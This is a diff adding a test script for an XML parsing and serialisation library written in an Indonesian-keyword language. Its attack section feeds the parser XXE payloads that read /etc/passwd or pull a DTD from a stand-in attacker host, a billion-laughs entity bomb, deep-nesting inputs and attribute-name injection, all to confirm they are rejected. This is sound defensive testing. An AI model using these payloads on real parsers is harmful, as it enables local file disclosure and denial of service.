@@ -1,0 +1,169 @@
+# pustaka/xml.idk: urai, namespace, bentuk, dan penolakan serangan XML.
+impor xml
+dari xml impor GalatXML
+
+DOK = """<?xml version="1.0" encoding="UTF-8"?>
+<!-- katalog toko buku -->
+<katalog xmlns="urn:buku" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <buku id="b1" dc:bahasa="id">
+    <judul>Laskar &amp; Pelangi</judul>
+    <catatan><![CDATA[<b>tebal</b> & mentah]]></catatan>
+    <harga mata_uang="IDR">85000</harga>
+  </buku>
+  <buku id="b2" dc:bahasa="ja">
+    <judul>日本語の本 &#x41;&#66; — ünïcödé</judul>
+    <harga mata_uang="JPY">1200</harga>
+    <stok/>
+  </buku>
+</katalog>
+<?catatan-akhir diabaikan?>"""
+
+fungsi uji_urai() {
+    cetak("== urai")
+    variabel akar = xml.urai(DOK)
+    cetak(akar.nama, akar.lokal(), repr(akar.awalan()), akar.ns, akar.ns_dekl, repr(akar))
+    untuk b dalam akar.cari_semua("buku") {
+        variabel h = b.cari("harga")
+        cetak(b.ambil("id"), b.ambil("dc:bahasa"), repr(b.cari("judul").teks()), h.teks(), h.ambil("mata_uang"), b.ambil("tidak_ada", "-"))
+    }
+    cetak(repr(akar.elemen()[0].cari("catatan").teks()))
+    cetak(akar.cari("buku", "urn:buku").ambil("id"), akar.cari("buku", "urn:lain"), akar.cari("buku", "urn:buku").cari("judul").ns)
+    cetak(panjang(akar.elemen()), panjang(akar.anak))
+    cetak(xml.bentuk(akar))
+    variabel ns = xml.urai("<a:x xmlns:a=\"urn:a\" a:id=\"1\" xml:lang=\"id\"><y xmlns=\"urn:b\"><z/></y></a:x>")
+    cetak(ns.ns, ns.lokal(), ns.awalan(), ns.atribut, ns.cari("y").ns, ns.cari("y").cari("z").ns)
+    cetak(repr(xml.urai("<p>a\r\nb\rc<q> x </q>&lt;&gt;&amp;&apos;&quot;</p>").teks()))
+    cetak(xml.urai("<a b='satu &quot;dua&quot;' c=\"t\tab\nbaris\"/>").atribut)
+    cetak(xml.urai(chr(65279) + "<bom/>").nama)
+}
+
+fungsi uji_bentuk() {
+    cetak("== bentuk")
+    variabel e = xml.buat("pesan", {"id": 7, "teks": "a\"b<c>&"}, "1 < 2 & \"ok\" ]]>")
+    e.tambah(xml.buat("anak")).tambah("ekor").tambah(42)
+    cetak(xml.bentuk(e, benar))
+    variabel f = xml.buat("r", {"xmlns": "urn:r", "xmlns:p": "urn:p"})
+    f.tambah(xml.buat("p:a", {"p:x": "1"}, "isi")).tambah(xml.buat("b").tambah(xml.buat("c")))
+    cetak(xml.bentuk(f, salah, "  "))
+    variabel pulang = xml.urai(xml.bentuk(f))
+    cetak(pulang.cari("a", "urn:p").ambil("p:x"), pulang.cari("b", "urn:r").nama)
+    variabel aneh = xml.buat("t", {"v": "tab\tbaris\ncr\r"}, "baris\r\nbaru")
+    variabel balik = xml.urai(xml.bentuk(aneh))
+    cetak(xml.bentuk(aneh))
+    cetak(repr(balik.ambil("v")), repr(balik.teks()))
+    cetak(xml.lolos("<&>"), xml.lolos_atribut("\"'<"), xml.nama_sah("a:b"), xml.nama_sah("1a"), xml.nama_sah("a:b:c"), xml.nama_sah("名前"))
+    untuk f2 dalam [fungsi() { kembalikan xml.buat("1salah") },
+                    fungsi() { kembalikan xml.buat("a", {"b c": "1"}) },
+                    fungsi() { kembalikan xml.bentuk(xml.buat("a", kosong, "x" + chr(1))) },
+                    fungsi() { kembalikan xml.bentuk("bukan elemen") }] {
+        coba {
+            cetak(f2())
+        } kecuali GalatXML sebagai g {
+            cetak(g.pesan)
+        }
+    }
+}
+
+fungsi coba_urai(s, batas_kedalaman = xml.BATAS_KEDALAMAN, batas_elemen = xml.BATAS_ELEMEN, batas_ukuran = xml.BATAS_UKURAN) {
+    coba {
+        cetak("DITERIMA:", xml.bentuk(xml.urai(s, batas_ukuran, batas_kedalaman, batas_elemen)))
+    } kecuali GalatXML sebagai g {
+        cetak(g.pesan)
+    }
+}
+
+fungsi uji_serangan() {
+    cetak("== serangan")
+    # XXE: entitas eksternal yang membaca berkas lokal.
+    coba_urai("<?xml version=\"1.0\"?>\n<!DOCTYPE r [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<r>&xxe;</r>")
+    # XXE lewat parameter entity dan URL.
+    coba_urai("<!DOCTYPE r [<!ENTITY % p SYSTEM \"http://penyerang.contoh/x.dtd\"> %p;]><r/>")
+    # Billion laughs: entitas bersarang yang berlipat eksponensial.
+    variabel lol = ["<!DOCTYPE lolz [<!ENTITY lol \"lol\">"]
+    untuk i dalam rentang(1, 10) {
+        tambah(lol, f"<!ENTITY lol{i} \"" + f"&lol{i - 1};" * 10 + "\">")
+    }
+    tambah(lol, "]><lolz>&lol9;</lolz>")
+    coba_urai(teks_gabung(lol, ""))
+    # Entitas tanpa DTD tetap ditolak, juga bila huruf kecil.
+    coba_urai("<r>&xxe;</r>")
+    coba_urai("<!doctype r><r/>")
+    coba_urai("<r><!DOCTYPE x></r>")
+    coba_urai("<r><!ENTITY x \"y\"></r>")
+    # Kedalaman: 10.000 elemen bersarang ditolak cepat oleh batas 256.
+    coba_urai("<a>" * 10000 + "</a>" * 10000)
+    # Dengan batas dinaikkan, parser iteratif tetap tidak kehabisan frame.
+    variabel dalam_sekali = xml.urai("<a>" * 3000 + "x" + "</a>" * 3000, xml.BATAS_UKURAN, 5000)
+    cetak("3000 tingkat:", dalam_sekali.teks())
+    coba_urai("<a>" + "<b/>" * 50 + "</a>", xml.BATAS_KEDALAMAN, 20)
+    coba_urai("<a>" + "x" * 2000 + "</a>", xml.BATAS_KEDALAMAN, xml.BATAS_ELEMEN, 1000)
+    variabel atribut_banyak = ["<a"]
+    untuk i dalam rentang(300) {
+        tambah(atribut_banyak, f" x{i}=\"1\"")
+    }
+    tambah(atribut_banyak, "/>")
+    coba_urai(teks_gabung(atribut_banyak, ""))
+    coba_urai("<a>&#1114112;</a>")
+    coba_urai("<a>&#99999999999999999999;</a>")
+}
+
+fungsi uji_tidak_sah() {
+    cetak("== tidak well-formed")
+    untuk s dalam ["", "   ", "<a><b></a>", "<a>", "<a></a><b/>", "teks<a/>", "<a/>teks",
+                   "<a b=\"1\" b=\"2\"/>", "<p:a/>", "<a x=\"<\"/>", "<a>]]></a>", "<a b=1/>",
+                   "<a b=\"1\"c=\"2\"/>", "<a><!-- x -- y --></a>", "<a>&#0;</a>", "<a>&#xD800;</a>",
+                   "<a>a & b</a>", "<a>" + chr(1) + "</a>", "<a xmlns:p=\"\"/>",
+                   "<a xmlns:p=\"u\" xmlns:q=\"u\" p:x=\"1\" q:x=\"2\"/>", "<xmlns:a/>", "< a/>",
+                   "<a></b >", "<a><![CDATA[x</a>", "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><a/>",
+                   "<?xml version=\"2.0\"?><a/>", "<a/><?xml version=\"1.0\"?>", "<a>\n<b>\n</c>\n</a>"] {
+        coba_urai(s)
+    }
+    coba {
+        xml.urai(5)
+    } kecuali GalatXML sebagai g {
+        cetak(g.pesan, g.baris)
+    }
+    coba {
+        xml.urai("<a>\n  <b>\n</a>")
+    } kecuali GalatXML sebagai g {
+        cetak(g.baris, g.kolom)
+    }
+}
+
+# Regresi tinjauan: teks terpotong-potong tetap linear, karakter terlarang
+# dan deklarasi namespace terlarang ditolak, nama diperiksa ulang di bentuk().
+fungsi uji_regresi() {
+    cetak("== regresi")
+    variabel p = []
+    untuk i dalam rentang(20000) {
+        tambah(p, "x<![CDATA[y]]><!---->")
+    }
+    variabel a = xml.urai("<a>" + teks_gabung(p, "") + "</a>")
+    cetak(panjang(a.teks()), panjang(a.anak))
+    cetak(xml.urai("<a>x<!--k-->y<b/>z<![CDATA[w]]></a>").anak)
+    untuk s dalam ["<a>" + chr(65534) + "</a>", "<a b=\"" + chr(65535) + "\"/>",
+                   "<a><!-- " + chr(1) + " --></a>", "<a><?p " + chr(1) + "?></a>",
+                   "<a xmlns:xml=\"urn:x\"/>", "<a xmlns=\"http://www.w3.org/XML/1998/namespace\"/>",
+                   "<a xmlns:p=\"http://www.w3.org/2000/xmlns/\"/>", "<a xmlns:xmlns=\"urn:x\"/>",
+                   "<a xmlns:xml=\"http://www.w3.org/XML/1998/namespace\"/>",
+                   "<a><?pi!x?></a>", "<a>&#x00000041;&#0000065;</a>"] {
+        coba_urai(s)
+    }
+    variabel e = xml.buat("a")
+    e.atribut["y onload=\"evil()\" z"] = "1"
+    variabel f = xml.buat("a")
+    f.nama = "a><x"
+    untuk x dalam [e, f] {
+        coba {
+            cetak(xml.bentuk(x))
+        } kecuali GalatXML sebagai g {
+            cetak(g.pesan)
+        }
+    }
+}
+
+uji_urai()
+uji_bentuk()
+uji_serangan()
+uji_tidak_sah()
+uji_regresi()
